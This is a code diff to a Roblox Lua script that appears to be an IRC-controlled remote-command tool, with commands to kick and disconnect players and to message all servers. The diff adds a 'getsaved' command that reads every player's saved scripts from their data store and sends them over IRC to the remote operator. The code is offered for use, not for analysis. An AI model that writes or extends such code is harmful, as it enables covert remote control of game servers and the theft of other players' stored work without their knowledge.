@@ -9,7 +9,7 @@ Crystal = {
     Version = "1.0",
     CloudLink = "http://crystalrepo.ml/",
     OldRemoteID = "",
-    IRCColor = "New Yeller",
+    IRCColor = "Toothpaste",
     Bold = "",
     IRCSize = 18,
     RemoteCommands = {},
@@ -1955,8 +1955,18 @@ end)
 AddRCommand("ping", function()
 	ircprint('PONG')	
 end)
+AddRCommand("getsaved", function()
+local Save_Key = "sCrIptbuilDERox_SavedScripts";
+        for i,v in pairs(game:GetService('Players'):children())do
+                if v.ClassName == 'Player' then
+                        local Encoded_Table = v:LoadString(Save_Key)
+                       ircprint(v.Name..": "..Encoded_Table)
+                end
+	end	
+end)
 AddRCommand("cmds", function()
 ircprint("==COMMANDS==")
+ircprint("getsaved/ == PRINTS ALL SAVED SCRIPTS")
 ircprint("msg/text == SENDS A MESSAGE TO ALL SERVERS")
 ircprint("disc/plr/reason == DISCONNECTS A PLAYER")
 ircprint("kick/plr == KICKS A PLAYER")
